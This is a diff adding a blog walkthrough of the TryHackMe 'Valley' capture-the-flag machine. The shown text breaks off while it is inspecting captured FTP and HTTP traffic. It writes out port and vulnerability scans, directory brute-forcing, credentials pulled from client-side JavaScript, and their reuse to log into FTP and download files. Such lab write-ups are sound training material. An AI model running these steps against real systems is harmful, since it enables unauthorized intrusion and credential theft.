@@ -1,0 +1,2316 @@
+---
+title: 'CTF - TryHackMe: Valley'
+description: ""
+published: 2023-06-13
+redirect_from: 
+            - http://salucci.ch/2023/06/13/ctf-tryhackme-valley/
+categories: "CTF, exploit, python, rce, reconnaissance, reverse-shell, shell, trustinveritas, tryhackme, web"
+hero: ./img/wp-content-uploads-2023-06-found-login-page-valley.png
+---
+
+
+### Level: **_Easy_**
+
+
+
+
+
+#### Introduction
+
+
+
+
+
+Boot the box and find a way in to escalate all the way to root!
+
+
+
+
+
+---
+
+
+
+
+
+#### Table of Content
+
+
+
+
+
+1. [Level: Easy](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#level-easy)
+
+   1. [Introduction](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#introduction)
+
+   2. [Table of Content](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#table-of-content)
+
+   3. [Reconnaissance](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#reconnaissance)
+
+      1. [PREPARATION](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#preparation)
+
+      2. [RUSTSCAN](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#rustscan)
+
+      3. [BURPSUITE - VISIT SITE - PORT: 80](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#burpsuite-visit-site-port-80)
+
+      4. [FEROXBUSTER](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#feroxbuster)
+
+      5. [GOBUSTER - /static/](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#gobuster-static)
+
+      6. [GOBUSTER - /pricing/](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#gobuster-pricing)
+
+      7. [GOBUSTER - /gallery/](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#gobuster-gallery)
+
+      8. [2nd RUSTSCAN](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#2nd-rustscan)
+
+      9. [FINDINGS UNTIL NOW](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#findings-until-now)
+
+      10. [BURPSUITE - VISIT SITE /static/00 - PORT: 80](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#burpsuite-visit-site-static-00-port-80)
+
+          1. [RESULTS](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#results)
+
+      11. [BURPSUITE - VISIT SITE /dev1243224123123 - PORT: 80](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#burpsuite-visit-site-dev1243224123123-port-80)
+
+          1. [RESULTS](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#results)
+
+      12. [OPEN DEV TOOLS IN GOOGLE CHROME - F12](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#open-dev-tools-in-google-chrome-f12)
+
+      13. [BURPSUITE - VISIT SITE /dev1243224123123 AND LOGIN - PORT: 80](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#burpsuite-visit-site-dev1243224123123-and-login-port-80)
+
+          1. [RESULTS](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#results)
+
+      14. [ACCESS THE FTP](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#access-the-ftp)
+
+      15. [FTP - ENUMERATION](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#ftp-enumeration)
+
+      16. [LET'S INSPECT THE PCAPNG FILES WITH WIRESHARK](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#let-s-inspect-the-pcapng-files-with-wireshark)
+
+   4. [Weaponization](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#weaponization)
+
+   5. [Delivery](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#delivery)
+
+   6. [Exploit](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#exploit)
+
+      1. [linPEAS](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#linpeas)
+      2. [linPEAS FINDINGS](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#linpeas-findings)
+
+   7. [Collection](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#collection)
+
+   8. [Discovery](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#discovery)
+
+   9. [Exploitation](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#exploitation)
+
+      1. [HASHCAT - WEAK PASSWORDS](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#hashcat-weak-passwords)
+
+   10. [Privilege Escalation](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#privilege-escalation)
+
+       1. [LET'S LOGIN WITH A OTHER ACCOUNT](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#let-s-login-with-a-other-account)
+       2. [THC HYDRA - USER / PASSWORD ENUMERATION (WITH KNOWN USERS/PASSWORDS)](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#thc-hydra-user-password-enumeration-with-known-users-passwords)
+       3. [linPEAS PE](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#linpeas-pe)
+       4. [HOW CAN WE ABUSE THIS ?](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#how-can-we-abuse-this)
+       5. [PYTHON - MODULE HIJACKING](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#python-module-hijacking)
+       6. [NETCAT LISTENER](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#netcat-listener)
+       7. [WE GOT ROOT ACCESS !](https://salucci.ch/2023/06/13/ctf-tryhackme-valley/#we-got-root-access)
+
+
+
+
+
+---
+
+
+
+
+
+#### Reconnaissance
+
+
+
+
+
+##### PREPARATION
+
+
+
+
+
+```
+mkdir Valley
+cd Valley
+mkdir scans
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### RUSTSCAN
+
+
+
+
+
+```
+sudo rustscan -a 10.10.228.74 --ulimit 5000 -- -oA scans/ -sC -sV --script vuln
+```
+
+
+
+
+
+```
+Open 10.10.228.74:<strong>22</strong>
+Open 10.10.228.74:<strong>80</strong>
+PORT   STATE SERVICE REASON         VERSION
+<strong>22</strong>/tcp open  <strong>ssh</strong>     syn-ack ttl 63 <strong>OpenSSH 8.2p1 Ubuntu 4ubuntu0.5</strong> (Ubuntu Linux; protocol 2.0)
+<strong>80</strong>/tcp open  <strong>http</strong>    syn-ack ttl 63 <strong>Apache httpd 2.4.41</strong> ((Ubuntu))
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable.
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### BURPSUITE - VISIT SITE - PORT: 80
+
+
+
+
+
+```
+# First GET-REQUEST to the site
+
+<strong>GET / HTTP/1.1
+</strong>
+Host: <strong>10.10.228.74
+</strong>
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+---
+
+<strong>GET /photo-1585640073714-8caeb6f11f66?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=2340&q=80</strong> <strong>HTTP/1.1
+</strong>
+Host: <strong>images.unsplash.com</strong>
+Sec-Ch-Ua: "Chromium";v="113", "Not-A.Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: http://10.10.228.74/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+
+# View Gallery
+
+<strong>GET /gallery/gallery.html HTTP/1.1
+</strong>
+Host: 10.10.228.74
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.228.74/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+---
+
+<strong>GET /static/1 HTTP/1.1
+</strong>
+Host: <strong>10.10.228.74</strong>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://10.10.228.74/gallery/gallery.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+...
+
+<strong>GET /static/18 HTTP/1.1
+</strong>
+Host: <strong>10.10.228.74
+</strong>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://10.10.228.74/gallery/gallery.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+
+# View Pricing
+
+<strong>GET /pricing/pricing.html HTTP/1.1
+</strong>
+Host: <strong>10.10.228.74
+</strong>
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.228.74/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### FEROXBUSTER
+
+
+
+
+
+Enumeration of the website to find hidden pages, notes or other interesting findings.
+
+
+
+
+
+```
+feroxbuster -u http://10.10.228.74/ -w /usr/share/dirb/wordlists/big.txt -d 0 -x php,txt,html,bak,js,docx,pdf,json,bat,cmd,ps1,sh
+```
+
+
+
+
+
+```
+<strong> ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</strong>
+by Ben "epi" Risher 🤓                 ver: 2.10.0
+───────────────────────────┬──────────────────────
+<strong> 🎯  Target Url            │ http://10.10.228.74/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/dirb/wordlists/big.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, txt, html, bak, js, docx, pdf, json, bat, cmd, ps1, sh]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ INFINITE</strong>
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       32l       61w      924c http://10.10.228.74/pricing/pricing.html
+200      GET       38l      129w     1163c http://10.10.228.74/index.html
+200      GET       52l      106w      945c http://10.10.228.74/styles.css
+200      GET      140l      394w     3940c http://10.10.228.74/gallery/gallery.html
+200      GET       38l      129w     1163c http://10.10.228.74/
+<strong>200      GET        3l       10w       57c http://10.10.228.74/pricing/note.txt</strong>
+301      GET        9l       28w      314c http://10.10.228.74/gallery => http://10.10.228.74/gallery/
+301      GET        9l       28w      314c http://10.10.228.74/pricing => http://10.10.228.74/pricing/
+301      GET        9l       28w      313c http://10.10.228.74/static => http://10.10.228.74/static/
+<strong>[####################] - 4m    266279/266279  0s      found:9       errors:0
+[####################] - 4m    266097/266097  1249/s  http://10.10.228.74/
+[####################] - 0s    266097/266097  3285148/s http://10.10.228.74/pricing/ => Directory listing
+[####################] - 0s    266097/266097  5913267/s http://10.10.228.74/gallery/ => Directory listing
+[####################] - 0s    266097/266097  7191811/s http://10.10.228.74/static/ => Directory listing</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### GOBUSTER - /static/
+
+
+
+
+
+Now let's investigate the findings of the different pages.
+
+
+
+
+
+```
+gobuster dir -u http://10.10.228.74/static/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,bak,js
+```
+
+
+
+
+
+```
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+<strong>[+] Url:                     http://10.10.228.74/static/</strong>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              php,txt,html,bak,js
+[+] Timeout:                 10s
+===============================================================
+2023/06/12 18:41:47 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htaccess.bak        (Status: 403) [Size: 277]
+/.htaccess.js         (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/.htpasswd.bak        (Status: 403) [Size: 277]
+/.htpasswd.js         (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+<strong>/00                   (Status: 200) [Size: 127]</strong>
+/11                   (Status: 200) [Size: 627909]
+/10                   (Status: 200) [Size: 2275927]
+/1                    (Status: 200) [Size: 2473315]
+/12                   (Status: 200) [Size: 2203486]
+/14                   (Status: 200) [Size: 3838999]
+/13                   (Status: 200) [Size: 3673497]
+/16                   (Status: 200) [Size: 2468462]
+/15                   (Status: 200) [Size: 3477315]
+/18                   (Status: 200) [Size: 2036137]
+/17                   (Status: 200) [Size: 3551807]
+/2                    (Status: 200) [Size: 3627113]
+/3                    (Status: 200) [Size: 421858]
+/5                    (Status: 200) [Size: 1426557]
+/6                    (Status: 200) [Size: 2115495]
+/4                    (Status: 200) [Size: 7389635]
+/9                    (Status: 200) [Size: 1190575]
+Progress: 6022 / 122820 (4.90%)[ERROR] 2023/06/12 18:42:21 [!] context deadline exceeded (Client.Timeout or context cancellation while reading body)
+/8                    (Status: 200) [Size: 7919631]
+Progress: 115030 / 122820 (93.66%)[ERROR] 2023/06/12 18:49:34 [!] Get "http://10.10.228.74/static/user_session.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 122714 / 122820 (99.91%)
+===============================================================
+2023/06/12 18:50:06 Finished
+===============================================================
+```
+
+
+
+
+
+##### GOBUSTER - /pricing/
+
+
+
+
+
+```
+gobuster dir -u http://10.10.228.74/pricing/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,bak,js
+```
+
+
+
+
+
+```
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+<strong>[+] Url:                     http://10.10.228.74/pricing/</strong>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              html,bak,js,php,txt
+[+] Timeout:                 10s
+===============================================================
+2023/06/12 19:01:43 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htaccess.bak        (Status: 403) [Size: 277]
+/.htaccess.js         (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htpasswd.bak        (Status: 403) [Size: 277]
+/.htpasswd.js         (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+<strong>/note.txt             (Status: 200) [Size: 57]</strong>
+/pricing.html         (Status: 200) [Size: 924]
+Progress: 122784 / 122820 (99.97%)
+===============================================================
+2023/06/12 19:09:43 Finished
+===============================================================
+```
+
+
+
+
+
+##### GOBUSTER - /gallery/
+
+
+
+
+
+```
+gobuster dir -u http://10.10.228.74/gallery/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,bak,js
+```
+
+
+
+
+
+```
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+<strong>[+] Url:                     http://10.10.228.74/gallery/</strong>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              php,txt,html,bak,js
+[+] Timeout:                 10s
+===============================================================
+2023/06/12 19:05:46 Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htaccess.bak        (Status: 403) [Size: 277]
+/.htaccess.js         (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/.htpasswd.bak        (Status: 403) [Size: 277]
+/.htpasswd.js         (Status: 403) [Size: 277]
+/gallery.html         (Status: 200) [Size: 3940]
+Progress: 122746 / 122820 (99.94%)
+===============================================================
+2023/06/12 19:13:58 Finished
+===============================================================
+```
+
+
+
+
+
+---
+
+
+
+
+
+> 
+>
+> **! IMPORTANT NOTE !**  
+> I like to rescan the target, in case the machine was still booting or I missed something, so run the `RUSTSCAN` again to not miss anything which could be helpful in a later step.
+>
+> Reconnaissance is in my eyes the most valuable and important thing!
+>
+> 
+>
+> _**trustinveritas**_
+
+
+
+
+
+---
+
+
+
+
+
+##### 2nd RUSTSCAN
+
+
+
+
+
+```
+sudo rustscan -a 10.10.228.74 --ulimit 5000 -- -oA scans/ -sC -sV --script vuln
+```
+
+
+
+
+
+```
+<strong>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'</strong>
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+🌍HACK THE PLANET🌍
+Open 10.10.228.74:22
+Open 10.10.228.74:80
+Open 10.10.228.74:<strong>37370</strong>
+<strong>37370</strong>/tcp open  <strong>ftp</strong>     syn-ack ttl 63 <strong>vsftpd 3.0.3</strong>
+<strong>Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### FINDINGS UNTIL NOW
+
+
+
+
+
+| FINDING                                                                                    | INFORMATION                                                                                                |
+| ------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------- |
+| Open Ports: 22 - SSH **OpenSSH 8.2p1 Ubuntu 4ubuntu0.5** 80 - HTTP **Apache httpd 2.4.41** | Open SSH and Webserver Port on a Linux Ubuntu Machine.                                                     |
+| **http://10.10.228.74/pricing/note.txt**                                                   | **J**, Please stop leaving notes randomly on the website -**RP**                                           |
+| **/00 (Status: 200) \[Size: 127]**                                                         | http://10.10.228.74/static/00 This site has a big difference in the size, compared to the other responses. |
+| Open Ports 2nd RUSTSCAN: 37370 - FTP **vsftpd 3.0.3**                                      | We found an FTP!                                                                                           |
+
+What do we have?
+
+
+
+
+
+
+
+
+
+---
+
+
+
+
+
+##### BURPSUITE - VISIT SITE /static/00 - PORT: 80
+
+
+
+
+
+```
+# First GET-REQUEST to the site
+
+<strong>GET /static/00 HTTP/1.1
+</strong>
+Host: <strong>10.10.228.74
+</strong>
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+
+
+
+
+###### RESULTS
+
+
+
+
+
+```
+dev notes from <strong>valleyDev</strong>:
+-add wedding photo examples
+-<strong>redo the editing on #4</strong>
+-remove <strong>/dev1243224123123</strong>
+-check for <strong>SIEM</strong> alerts
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### BURPSUITE - VISIT SITE /dev1243224123123 - PORT: 80
+
+
+
+
+
+```
+# First GET-REQUEST to the site
+
+<strong>GET /dev1243224123123 HTTP/1.1
+</strong>
+Host: <strong>10.10.228.74
+</strong>
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+
+
+
+
+###### RESULTS
+
+
+
+
+
+![](./img/wp-content-uploads-2023-06-found-login-page-valley.png)
+
+
+
+
+
+
+
+
+
+```
+# We found a login page !
+_ Maybe the smell of an SQLi ?
+_ Maybe the smell of weak credentials ?
+
+# Weak Credentials
+admin:admin
+F=Invalid username and/or password
+
+valleyDev:admin
+F=Invalid username and/or password
+
+J:admin
+F=Invalid username and/or password
+
+RP:admin
+F=Invalid username and/or password
+```
+
+
+
+
+
+---
+
+
+
+
+
+> 
+>
+> Alright, folks, before we dive headfirst into the deep and murky waters of cyber complexity, let's take a moment to familiarize ourselves with the humble login page. Picture it as our home base, our safety net, the fluffy marshmallow at the bottom of our hot chocolate cup of hacking. It's basic, it's cozy, it's familiar - and it's just begging for us to take a closer look before we catapult ourselves into the exhilarating whirlwind of web-based wizardry. So gather 'round, cyber comrades, and let's get to know our dear friend, the login page!
+>
+> 
+>
+> **_trustinveritas_**
+
+
+
+
+
+---
+
+
+
+
+
+##### OPEN DEV TOOLS IN GOOGLE CHROME - F12
+
+
+
+
+
+```
+# Go to <strong>Sources</strong>
+_ Check index.html
+_ Check button.js
+_ Check dev.js
+
+# Wait what?! <strong>dev.js</strong>
+```
+
+
+
+
+
+```
+const loginForm = document.getElementById("login-form");
+const loginButton = document.getElementById("login-form-submit");
+const loginErrorMsg = document.getElementById("login-error-msg");
+
+loginForm.style.border = '2px solid #ccc';
+loginForm.style.padding = '20px';
+loginButton.style.backgroundColor = '#007bff';
+loginButton.style.border = 'none';
+loginButton.style.borderRadius = '5px';
+loginButton.style.color = '#fff';
+loginButton.style.cursor = 'pointer';
+loginButton.style.padding = '10px';
+loginButton.style.marginTop = '10px';
+
+
+function isValidUsername(username) {
+
+	if(username.length < 5) {
+
+	console.log("Username is valid");
+
+	}
+	else {
+
+	console.log("Invalid Username");
+
+	}
+
+}
+
+function isValidPassword(password) {
+
+	if(password.length < 7) {
+
+        console.log("Password is valid");
+
+        }
+        else {
+
+        console.log("Invalid Password");
+
+        }
+
+}
+
+function showErrorMessage(element, message) {
+  const error = element.parentElement.querySelector('.error');
+  error.textContent = message;
+  error.style.display = 'block';
+}
+
+loginButton.addEventListener("click", (e) => {
+    e.preventDefault();
+    const username = loginForm.username.value;
+    const password = loginForm.password.value;
+
+    if (username === "siemDev" && password === "california") {
+        window.location.href = "/dev1243224123123/devNotes37370.txt";
+    } else {
+        loginErrorMsg.style.opacity = 1;
+    }
+})
+```
+
+
+
+
+
+```
+<strong>[SNIP]</strong>
+
+loginButton.addEventListener("click", (e) => {
+    e.preventDefault();
+    const username = loginForm.username.value;
+    const password = loginForm.password.value;
+
+    if (username === "<strong>siemDev</strong>" && password === "<strong>california</strong>") {
+        window.location.href = "<strong>/dev1243224123123/devNotes37370.txt</strong>";
+    } else {
+        loginErrorMsg.style.opacity = 1;
+    }
+})
+
+<strong>[SNIP]</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### BURPSUITE - VISIT SITE /dev1243224123123 AND LOGIN - PORT: 80
+
+
+
+
+
+```
+# Let's try the credentials
+<strong>siemDev:california</strong>
+
+<strong>GET /dev1243224123123/devNotes37370.txt HTTP/1.1
+</strong>
+Host: <strong>10.10.228.74
+</strong>
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.228.74/dev1243224123123/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+```
+
+
+
+
+
+###### RESULTS
+
+
+
+
+
+```
+<strong>dev notes for ftp server:</strong>
+-<strong>stop reusing credentials</strong>
+-check for any vulnerabilies
+-stay up to date on patching
+-<strong>change ftp port to normal port</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### ACCESS THE FTP
+
+
+
+
+
+```
+# It was the smell of weak credentials
+Let's <strong>use the same credentials</strong> to access the FTP
+
+<strong>siemDev:california</strong>
+
+< BOOM - We're in ! >
+```
+
+
+
+
+
+```
+ftp 10.10.228.74 37370
+Connected to 10.10.228.74.
+220 (vsFTPd 3.0.3)
+siemDev
+331 Please specify the password.
+california
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### FTP - ENUMERATION
+
+
+
+
+
+```
+ls -a
+229 Entering Extended Passive Mode (|||12369|)
+150 Here comes the directory listing.
+dr-xr-xr-x    2 1001     1001         4096 Mar 06 14:06 .
+dr-xr-xr-x    2 1001     1001         4096 Mar 06 14:06 ..
+-rw-rw-r--    1 1000     1000         7272 Mar 06 13:55 siemFTP.pcapng
+-rw-rw-r--    1 1000     1000      1978716 Mar 06 13:55 siemHTTP1.pcapng
+-rw-rw-r--    1 1000     1000      1972448 Mar 06 14:06 siemHTTP2.pcapng
+226 Directory send OK.
+```
+
+
+
+
+
+```
+# Let's download all the files from the FTP
+```
+
+
+
+
+
+```
+wget --mirror 'ftp://siemDev:california@10.10.228.74:37370'
+```
+
+
+
+
+
+---
+
+
+
+
+
+##### LET'S INSPECT THE PCAPNG FILES WITH WIRESHARK
+
+
+
+
+
+```
+# File: <strong>siemFTP.pcapng</strong>
+Wireshark Filter: <strong>ftp</strong>
+
+6	3.591118517	192.168.111.136	37648	192.168.111.136	21	FTP	84	Request: <strong>USER anonymous</strong>
+8	3.591269528	192.168.111.136	21	192.168.111.136	37648	FTP	102	Response: 331 Please specify the password.
+10	5.311666974	192.168.111.136	37648	192.168.111.136	21	FTP	84	Request: <strong>PASS anonymous</strong>
+11	5.314430275	192.168.111.136	21	192.168.111.136	37648	FTP	91	Response: <strong>230 Login successful.</strong>
+
+# <strong>Follow TCP Stream</strong>
+
+220 (vsFTPd 3.0.3)
+USER anonymous
+331 Please specify the password.
+PASS anonymous
+230 Login successful.
+SYST
+215 UNIX Type: L8
+FEAT
+211-Features:
+ EPRT
+ EPSV
+ MDTM
+ PASV
+ REST STREAM
+ SIZE
+ TVFS
+211 End
+EPSV
+229 Entering Extended Passive Mode (|||20349|)
+LIST
+150 Here comes the directory listing.
+226 Directory send OK.
+EPSV
+229 Entering Extended Passive Mode (|||6658|)
+NLST
+150 Here comes the directory listing.
+226 Directory send OK.
+QUIT
+221 Goodbye.
+
+
+# Let's search for other Logins / Passwords
+Wireshark Filter:
+<strong>ftp.request.command == "PASS"</strong>
+<strong>ftp.request.command == "USER"</strong>
+```
+
+
+
+
+
+---
+
+
+
+
+
+```
+# File: <strong>siemHTTP1.pcapng</strong>
+Wireshark Filter: <strong>http</strong>
+
+5	2.463838672	192.168.111.136	58554	34.218.221.118	80	HTTP	464	[TCP Previous segment not captured] <strong>GET /testcat_mb.html HTTP/1.1</strong>
+7	2.549300001	34.218.221.118	80	192.168.111.136	58554	HTTP	895	<strong>HTTP/1.1 200 OK  (text/html)</strong>
+9	2.625802914	192.168.111.136	58554	34.218.221.118	80	HTTP	385	GET /favicon.ico HTTP/1.1
